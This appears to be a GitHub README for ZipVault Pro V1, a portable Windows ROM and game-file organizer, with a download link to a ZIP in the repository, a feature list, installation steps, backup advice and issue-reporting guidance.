# ZipVault Pro V1

**ZipVault Pro** is a Windows ROM and game-file organizer designed to help users manage retro-game collections more safely and efficiently. It includes ZIP tools, duplicate checking, ROM-extension support, game-title support, and preview tools for working with local game files.

> **Important:** ZipVault Pro does not include ROMs, BIOS files, games, or emulators. Always test file-organizing operations on copied files before using your main collection.

## Download ZipVault Pro

**[Download ZipVault Pro V1 (.zip)](https://github.com/akaidragon123k/ZipVault-Pro-V1/raw/refs/heads/main/zipvault_pro%20V1.zip)**

No installer is required for this version. Download the ZIP, extract it, and run the application.

## Features

- Windows ROM and game-file organization
- ZIP-file tools
- Duplicate checking
- ROM-extension support
- Game-title support
- Safe preview tools before making changes
- Portable ZIP package

## Installation

1. Download **ZipVault Pro V1** using the link above.
2. Extract the downloaded ZIP file to a folder on your computer.
3. Keep `game title.zip` in the same folder as the application if ZipVault Pro needs it.
4. Run `ZipVault Pro.exe`.
5. Test the program on **copied files first** before using your main ROM or game collection.

## Who ZipVault Pro Is For

ZipVault Pro is intended for Windows users who manage ROM libraries, retro-game collections, archived game files, or other game-related ZIP collections and want tools for organization, duplicate checking, and file review.

## Safety

ZipVault Pro organizes files on your computer. Before using it on an important collection:

- Make a backup or work with copied files.
- Preview and verify results before making large changes.
- Keep an untouched copy of important ROM or game files whenever possible.

See the repository's [Security Policy](SECURITY.md) for additional safety information.

## Support and Feedback

If you find a problem or have a suggestion, use the repository's **Issues** section so reports can be tracked in one place.

When reporting a problem, please include your Windows version, what you were trying to do, what happened, and a screenshot or error message when available. Do not upload copyrighted ROMs, BIOS files, or games to an issue.
